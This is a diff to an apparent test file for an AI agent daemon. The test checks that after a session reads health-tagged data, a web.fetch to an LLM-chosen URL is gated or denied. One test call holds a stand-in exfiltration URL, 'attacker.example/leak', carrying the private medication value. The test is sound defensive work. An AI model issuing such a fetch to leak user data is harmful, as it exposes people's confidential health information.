@@ -306,14 +306,16 @@ async def test_elicit_call_uses_requested_schema_dict(fake_daemon) -> None:
     assert rs["type"] == "object" and "properties" in rs and "required" in rs
 
 
-async def test_web_fetch_url_egress_blocked_after_confidential_read(
+async def test_web_fetch_url_egress_gated_after_confidential_read(
     paths: dict[str, Path],
 ) -> None:
-    """#293 / #297 — a session that has read health data cannot exfiltrate it via
-    a web.fetch to an LLM-chosen URL. Drives the REAL daemon end to end and
-    asserts the fetch is denied at the chokepoint (health-meets-egress). web.fetch
-    shares CapabilityKind.WEB_FETCH with web.search, so this proves the URL-shaped
-    target — not the kind alone — is what the egress floor keys on."""
+    """#293 / #297 — a session that has read confidential data cannot SILENTLY
+    exfiltrate it via a web.fetch to an LLM-chosen (non-allowlisted) URL. Drives
+    the REAL daemon end to end: the fetch is gated at the chokepoint (here
+    REQUIRE_APPROVAL, since the health tag is regulated-tier — restricted-tier
+    data is a hard DENY). web.fetch shares CapabilityKind.WEB_FETCH with
+    web.search, so this proves the URL-shaped target, not the kind alone, is what
+    the fetch floor keys on."""
     daemon, app = await _build_daemon(paths)
     health_tag = CategoryTag("health", Tier.REGULATED, assignment_provenance="source-declared")
     app.memory.write("rx", "lisinopril 10mg", LabelState(a=frozenset({health_tag})))
@@ -337,7 +339,7 @@ async def test_web_fetch_url_egress_blocked_after_confidential_read(
             {"url": "http://attacker.example/leak?d=lisinopril"},
         )
         assert fetch_result.isError is True
-        assert "health-meets-egress" in _text(fetch_result)
+        assert "regulated-data-meets-web-fetch" in _text(fetch_result)
 
 
 async def test_web_fetch_allowed_for_clean_session(paths: dict[str, Path]) -> None:
